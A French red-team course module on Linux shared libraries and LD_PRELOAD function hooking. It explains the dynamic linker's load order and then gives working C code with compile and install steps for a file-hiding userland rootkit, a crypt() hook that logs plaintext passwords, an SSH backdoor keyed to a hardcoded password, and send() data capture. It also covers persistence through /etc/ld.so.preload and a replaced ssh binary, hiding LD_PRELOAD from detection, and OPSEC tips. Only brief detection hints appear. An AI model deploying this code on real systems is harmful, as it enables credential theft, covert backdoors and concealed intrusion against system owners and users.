# Module L05 : Shared Libraries - Injection et Hooking via LD_PRELOAD

## Ce que tu vas apprendre

Dans ce module, tu vas maîtriser les bibliothèques partagées sous Linux :
- Comprendre le fonctionnement des shared libraries (.so)
- Utiliser LD_PRELOAD pour injecter du code
- Hooker des fonctions système (write, open, exec)
- Créer des backdoors via library injection
- Techniques d'évasion et de persistence Red Team

## Théorie

### C'est quoi une Shared Library ?

Une **shared library** (bibliothèque partagée) est un fichier contenant du code compilé qui peut être utilisé par plusieurs programmes en même temps.

**Analogie** :
```ascii
Imagine une bibliothèque publique :

Programme 1          Programme 2          Programme 3
    │                    │                    │
    └────────┬───────────┴────────────────────┘
             │
             ▼
    ┌────────────────────┐
    │   libc.so.6        │  ← Bibliothèque partagée
    │                    │
    │  - printf()        │
    │  - malloc()        │
    │  - open()          │
    └────────────────────┘

Avantage : Le code n'est chargé qu'UNE fois en mémoire,
           partagé par tous les programmes
```

### Architecture des Shared Libraries

```ascii
┌─────────────────────────────────────────────────────────────┐
│                    PROGRAMME EXÉCUTABLE                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   int main() {                                              │
│       printf("Hello\n");  ← Appel fonction externe         │
│   }                                                         │
│                                                             │
└────────────────────┬────────────────────────────────────────┘
                     │
                     │ Linkage dynamique au runtime
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│              DYNAMIC LINKER/LOADER (ld.so)                  │
│                                                             │
│  1. Lit les dépendances (ldd)                               │
│  2. Charge les .so en mémoire                               │
│  3. Résout les symboles (printf → adresse dans libc)       │
│  4. Applique les relocations                                │
│                                                             │
└────────────┬────────────────────────────────────────────────┘
             │
             │ Recherche dans cet ordre :
             │
             ├─→ 1. LD_PRELOAD (variables d'environnement)
             │
             ├─→ 2. RPATH (dans l'ELF)
             │
             ├─→ 3. LD_LIBRARY_PATH
             │
             └─→ 4. /etc/ld.so.cache (cache système)
                 │
                 └─→ 5. /lib, /usr/lib (chemins par défaut)
```

### Pourquoi LD_PRELOAD est dangereux ?

**LD_PRELOAD** permet de charger une bibliothèque AVANT toutes les autres, incluant la libc.

```ascii
SANS LD_PRELOAD :
Programme → libc.so → Kernel
              ↑
        Fonction originale

AVEC LD_PRELOAD :
Programme → evil.so → libc.so → Kernel
              ↑          ↑
          Hook      Fonction originale

Tu peux intercepter TOUTES les fonctions libc !
```

**Cas d'usage Red Team** :
1. **Hooking de fonctions** : Intercepter open(), read(), write()
2. **Backdoor persistence** : Injecter du code dans tous les processus
3. **Credential stealing** : Hooker les fonctions de login (PAM, SSH)
4. **Rootkit userland** : Cacher des fichiers, processus, connexions
5. **Bypass sandbox** : Modifier le comportement de fonctions sécuritaires

## Visualisation

### Processus de résolution de symboles

```ascii
┌──────────────────────────────────────────────────────────────┐
│                  PROGRAMME : ./app                           │
│                                                              │
│  #include <stdio.h>                                          │
│  int main() {                                                │
│      printf("Test\n");  ← Symbole non résolu               │
│  }                                                           │
└────────────────────┬─────────────────────────────────────────┘
                     │
                     │ Exécution : ./app
                     ▼
┌──────────────────────────────────────────────────────────────┐
│              DYNAMIC LINKER (ld-linux.so)                    │
│                                                              │
│  1. Lire les dépendances :                                   │
│     DT_NEEDED: libc.so.6                                     │
│                                                              │
│  2. Vérifier LD_PRELOAD :                                    │
│     LD_PRELOAD=/tmp/hook.so                                  │
│                                                              │
│  3. Ordre de chargement :                                    │
│     - /tmp/hook.so       (PRELOAD)                           │
│     - /lib/libc.so.6     (NEEDED)                            │
│                                                              │
│  4. Résolution de 'printf' :                                 │
│     - Chercher dans hook.so... TROUVÉ !                      │
│     - (libc.so.6 est ignoré)                                 │
│                                                              │
└────────────────────┬─────────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────────┐
│                  /tmp/hook.so                                │
│                                                              │
│  int printf(const char *fmt, ...) {                          │
│      // TON CODE MALVEILLANT ICI                             │
│      return 0;                                               │
│  }                                                           │
└──────────────────────────────────────────────────────────────┘
```

### Memory Layout avec LD_PRELOAD

```ascii
MEMORY LAYOUT d'un processus :

Haute adresse
┌──────────────────────────────────┐
│         KERNEL SPACE             │
│         (inaccessible)           │
├──────────────────────────────────┤
│           STACK                  │
│         [rsp, rbp]               │
├──────────────────────────────────┤
│          HEAP                    │
│        (malloc)                  │
├──────────────────────────────────┤
│                                  │
│       SHARED LIBRARIES           │
│                                  │
│  ┌────────────────────────┐     │
│  │   hook.so (PRELOAD)    │ ← Chargé en premier
│  │  0x7f1234560000        │
│  ├────────────────────────┤     │
│  │   libc.so.6            │
│  │  0x7f1234000000        │
│  ├────────────────────────┤     │
│  │   ld-linux.so          │
│  │  0x7f1230000000        │
│  └────────────────────────┘     │
│                                  │
├──────────────────────────────────┤
│      CODE SEGMENT (.text)        │
│     (programme principal)        │
├──────────────────────────────────┤
│      DATA SEGMENT                │
│    (.data, .bss, .rodata)        │
└──────────────────────────────────┘
Basse adresse
```

## Mise en pratique

### Exemple 1 : Hook basique de printf

**Créer la bibliothèque malveillante :**

```c
// hook_printf.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdarg.h>

// Pointeur vers le vrai printf
static int (*real_printf)(const char *, ...) = NULL;

// Notre hook
int printf(const char *format, ...) {
    // Charger le vrai printf la première fois
    if (!real_printf) {
        real_printf = dlsym(RTLD_NEXT, "printf");
    }

    // Intercepter l'appel
    fprintf(stderr, "[HOOK] printf() intercepté !\n");

    // Appeler le vrai printf
    va_list args;
    va_start(args, format);
    int ret = vprintf(format, args);
    va_end(args);

    return ret;
}
```

**Programme cible :**

```c
// target.c
#include <stdio.h>

int main(void) {
    printf("Hello World\n");
    printf("Test 123\n");
    return 0;
}
```

**Compilation et test :**

```bash
# Compiler le programme cible
gcc -o target target.c

# Compiler le hook en shared library
gcc -shared -fPIC -o hook_printf.so hook_printf.c -ldl

# Exécuter SANS hook
./target
# Sortie :
# Hello World
# Test 123

# Exécuter AVEC hook
LD_PRELOAD=./hook_printf.so ./target
# Sortie :
# [HOOK] printf() intercepté !
# Hello World
# [HOOK] printf() intercepté !
# Test 123
```

### Exemple 2 : Hook de open() pour cacher des fichiers

**Rootkit userland basique :**

```c
// rootkit.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>
#include <errno.h>

// Vrai open()
static int (*real_open)(const char *, int, ...) = NULL;

// Fichier à cacher
#define HIDDEN_FILE "/tmp/secret.txt"

int open(const char *pathname, int flags, ...) {
    // Initialiser le vrai open
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

    // Bloquer l'accès au fichier caché
    if (pathname && strstr(pathname, HIDDEN_FILE)) {
        fprintf(stderr, "[ROOTKIT] Accès bloqué à %s\n", pathname);
        errno = ENOENT;  // File not found
        return -1;
    }

    // Appeler le vrai open pour les autres fichiers
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }

    return real_open(pathname, flags);
}

// Hook de fopen aussi
static FILE *(*real_fopen)(const char *, const char *) = NULL;

FILE *fopen(const char *pathname, const char *mode) {
    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (pathname && strstr(pathname, HIDDEN_FILE)) {
        fprintf(stderr, "[ROOTKIT] fopen bloqué pour %s\n", pathname);
        errno = ENOENT;
        return NULL;
    }

    return real_fopen(pathname, mode);
}
```

**Test :**

```bash
# Créer le fichier secret
echo "TOP SECRET DATA" > /tmp/secret.txt

# Compiler le rootkit
gcc -shared -fPIC -o rootkit.so rootkit.c -ldl

# Test normal (sans hook)
cat /tmp/secret.txt
# Sortie : TOP SECRET DATA

# Test avec hook
LD_PRELOAD=./rootkit.so cat /tmp/secret.txt
# Sortie :
# [ROOTKIT] fopen bloqué pour /tmp/secret.txt
# cat: /tmp/secret.txt: No such file or directory
```

### Exemple 3 : Credential Stealing via hook de getpwnam

```c
// steal_creds.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <pwd.h>
#include <string.h>
#include <time.h>

static struct passwd *(*real_getpwnam)(const char *) = NULL;

// Hook de getpwnam (utilisé pour la résolution username→UID)
struct passwd *getpwnam(const char *name) {
    if (!real_getpwnam) {
        real_getpwnam = dlsym(RTLD_NEXT, "getpwnam");
    }

    // Logger les tentatives de lookup
    FILE *log = fopen("/tmp/.creds_log", "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%s] getpwnam: %s\n", ctime(&now), name);
        fclose(log);
    }

    return real_getpwnam(name);
}

// Hook plus avancé : crypt() (utilisé par PAM pour hasher passwords)
static char *(*real_crypt)(const char *, const char *) = NULL;

char *crypt(const char *key, const char *salt) {
    if (!real_crypt) {
        real_crypt = dlsym(RTLD_NEXT, "crypt");
    }

    // EXFILTRER LE PASSWORD EN CLAIR !
    FILE *log = fopen("/tmp/.passwords", "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%s] Password: %s (salt: %s)\n",
                ctime(&now), key, salt);
        fclose(log);
    }

    return real_crypt(key, salt);
}
```

**Utilisation :**

```bash
# Compiler
gcc -shared -fPIC -o steal_creds.so steal_creds.c -ldl -lcrypt

# Injecter globalement (DANGEREUX, juste pour la démo)
export LD_PRELOAD=/tmp/steal_creds.so

# Maintenant, toutes les authentifications seront loggées
su - user
# Le password tapé sera dans /tmp/.passwords !
```

### Exemple 4 : Backdoor SSH via LD_PRELOAD

```c
// ssh_backdoor.c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

// Mot de passe backdoor
#define BACKDOOR_PASS "letmein123"

// Hook de la comparaison de mots de passe
static int (*real_strcmp)(const char *, const char *) = NULL;

int strcmp(const char *s1, const char *s2) {
    if (!real_strcmp) {
        real_strcmp = dlsym(RTLD_NEXT, "strcmp");
    }

    // Si c'est notre backdoor, faire comme si les passwords matchent
    if ((s1 && real_strcmp(s1, BACKDOOR_PASS) == 0) ||
        (s2 && real_strcmp(s2, BACKDOOR_PASS) == 0)) {
        return 0;  // Match !
    }

    return real_strcmp(s1, s2);
}

// Variante pour strncmp
static int (*real_strncmp)(const char *, const char *, size_t) = NULL;

int strncmp(const char *s1, const char *s2, size_t n) {
    if (!real_strncmp) {
        real_strncmp = dlsym(RTLD_NEXT, "strncmp");
    }

    if ((s1 && real_strncmp(s1, BACKDOOR_PASS, strlen(BACKDOOR_PASS)) == 0) ||
        (s2 && real_strncmp(s2, BACKDOOR_PASS, strlen(BACKDOOR_PASS)) == 0)) {
        return 0;
    }

    return real_strncmp(s1, s2, n);
}
```

**Installation persistante :**

```bash
# Compiler
gcc -shared -fPIC -o ssh_backdoor.so ssh_backdoor.c -ldl

# Copier dans un emplacement système
sudo cp ssh_backdoor.so /usr/lib/x86_64-linux-gnu/

# Modifier /etc/environment (persistence)
echo "LD_PRELOAD=/usr/lib/x86_64-linux-gnu/ssh_backdoor.so" | sudo tee -a /etc/environment

# OU modifier le config SSH directement
# (Ajouter dans /etc/ssh/sshd_config)
# PermitUserEnvironment yes
```

### Exemple 5 : Détection et bypass anti-debug

```c
// anti_debug_bypass.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <stdarg.h>
#include <sys/types.h>

static long (*real_ptrace)(int, ...) = NULL;

// Hook ptrace pour bypasser les anti-debug
long ptrace(int request, ...) {
    if (!real_ptrace) {
        real_ptrace = dlsym(RTLD_NEXT, "ptrace");
    }

    // Si le programme essaie de détecter un debugger via ptrace
    if (request == PTRACE_TRACEME) {
        // Retourner succès (pas de debugger détecté)
        fprintf(stderr, "[BYPASS] ptrace(TRACEME) bypassé\n");
        return 0;
    }

    // Appel normal pour les autres cas
    va_list args;
    va_start(args, request);
    pid_t pid = va_arg(args, pid_t);
    void *addr = va_arg(args, void *);
    void *data = va_arg(args, void *);
    va_end(args);

    return real_ptrace(request, pid, addr, data);
}
```

## Application offensive

### Contexte Red Team

#### 1. Persistence via /etc/ld.so.preload

**Fichier de configuration système** :

```bash
# /etc/ld.so.preload contient les libraries à précharger globalement
# Affecte TOUS les processus du système

# Installation
echo "/var/lib/malicious.so" | sudo tee /etc/ld.so.preload

# Maintenant, malicious.so est chargé dans tous les nouveaux processus !
```

**Avantages** :
- Survit aux redémarrages
- Affecte tous les utilisateurs
- Difficile à détecter sans inspection manuelle

**Détection** :
```bash
# Vérifier le fichier
cat /etc/ld.so.preload

# Vérifier les libraries chargées d'un processus
cat /proc/PID/maps | grep "\.so"
```

#### 2. Injection dans des processus spécifiques

**Via wrapper script** :

```bash
#!/bin/bash
# /usr/local/bin/ssh (wrapper)

# Charger notre backdoor avant le vrai SSH
export LD_PRELOAD=/lib/ssh_hook.so
exec /usr/bin/ssh.real "$@"
```

```bash
# Déplacer le vrai SSH
sudo mv /usr/bin/ssh /usr/bin/ssh.real

# Installer le wrapper
sudo cp ssh_wrapper.sh /usr/bin/ssh
sudo chmod +x /usr/bin/ssh
```

#### 3. Hooking de fonctions réseau

```c
// net_spy.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;

// Logger toutes les connexions sortantes
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_connect) {
        real_connect = dlsym(RTLD_NEXT, "connect");
    }

    // Logger l'IP et le port
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        FILE *log = fopen("/tmp/.net_log", "a");
        if (log) {
            fprintf(log, "CONNECT: %s:%d\n",
                    inet_ntoa(sin->sin_addr),
                    ntohs(sin->sin_port));
            fclose(log);
        }
    }

    return real_connect(sockfd, addr, addrlen);
}

// Hook send/recv pour exfiltrer les données
static ssize_t (*real_send)(int, const void *, size_t, int) = NULL;

ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
    if (!real_send) {
        real_send = dlsym(RTLD_NEXT, "send");
    }

    // Exfiltrer les données envoyées
    FILE *log = fopen("/tmp/.data_sent", "a");
    if (log) {
        fwrite(buf, 1, len, log);
        fclose(log);
    }

    return real_send(sockfd, buf, len, flags);
}
```

### Considérations OPSEC

**1. Détection**

**Indicateurs** :
- Variable `LD_PRELOAD` dans l'environnement
- Fichier `/etc/ld.so.preload` non vide
- Libraries suspectes dans `/proc/PID/maps`

**Evasion** :
```c
// Cacher la variable LD_PRELOAD dans /proc/PID/environ
static char *(*real_getenv)(const char *) = NULL;

// Hook pour masquer LD_PRELOAD dans getenv()
char *getenv(const char *name) {
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    if (strcmp(name, "LD_PRELOAD") == 0) {
        return NULL;  // Rien à voir ici...
    }
    return real_getenv(name);
}
```

**2. Bypass de LD_PRELOAD**

**Certains binaires ignorent LD_PRELOAD** :
- Binaires SUID/SGID (sécurité)
- Programmes avec capabilities
- Binaires statiquement linkés

**Contournement** :
- Patcher directement le binaire (GOT/PLT hooking)
- Utiliser ptrace pour injection
- Kernel module (LKM)

**3. Furtivité**

**Bonnes pratiques** :
```c
// Mauvais : Logs évidents
fprintf(stderr, "[MALWARE] Password: %s\n", pass);

// Bon : Exfiltration discrète
int fd = open("/dev/shm/.x", O_WRONLY | O_APPEND | O_CREAT, 0600);
write(fd, pass, strlen(pass));
close(fd);
```

## Résumé

- Les shared libraries (.so) sont chargées dynamiquement au runtime
- `LD_PRELOAD` permet d'injecter du code AVANT la libc
- Utilisation de `dlsym(RTLD_NEXT)` pour appeler la vraie fonction
- Applications Red Team :
  - Backdoors persistantes via `/etc/ld.so.preload`
  - Credential stealing (hook de crypt, strcmp)
  - Rootkits userland (cacher fichiers/processus)
  - Espionnage réseau (hook connect/send/recv)
- Détection : vérifier LD_PRELOAD, /etc/ld.so.preload, /proc/PID/maps
- Limitations : ne fonctionne pas sur SUID/binaires statiques

## Ressources complémentaires

**Documentation** :
- `man ld.so` - Dynamic linker/loader
- `man dlsym` - Obtenir l'adresse d'un symbole
- `man 8 ld-linux.so` - Comportement du linker

**Commandes utiles** :
```bash
# Voir les dépendances d'un binaire
ldd /bin/ls

# Voir le cache du linker
ldconfig -p

# Trace le chargement des libraries
LD_DEBUG=libs ./programme

# Voir les symbols exportés d'une .so
nm -D library.so
objdump -T library.so
```

**Outils** :
- `ltrace` - Tracer les appels library
- `Frida` - Hooking dynamique avancé
- `LD_AUDIT` - Interface officielle pour auditer le linking

---

**Navigation**
- [Module précédent](../L04_proc_filesystem/)
- [Module suivant](../L06_networking_linux/)
